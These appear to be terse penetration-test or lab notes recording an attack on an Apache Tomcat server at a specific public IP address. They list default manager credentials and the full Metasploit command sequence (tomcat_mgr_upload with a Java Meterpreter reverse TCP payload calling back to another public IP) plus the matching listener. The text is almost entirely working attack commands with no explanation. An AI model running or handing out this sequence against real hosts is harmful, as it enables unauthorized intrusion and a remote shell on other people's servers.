NMAP

```
18.158.110.24
```

Port 8080:

```
tomcat:password
```

```
use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 18.158.110.24
set RPORT 8080

set HttpUsername tomcat
set HttpPassword password

set payload java/meterpreter/reverse_tcp

set LPORT 5555
set ReverseListenerBindAddress 0.0.0.0  
set LHOST 212.129.9.19

exploit
```

```
use exploit/multi/handler  
set payload java/meterpreter/reverse_tcp  
set LHOST 0.0.0.0  
set LPORT 5555  
run
```


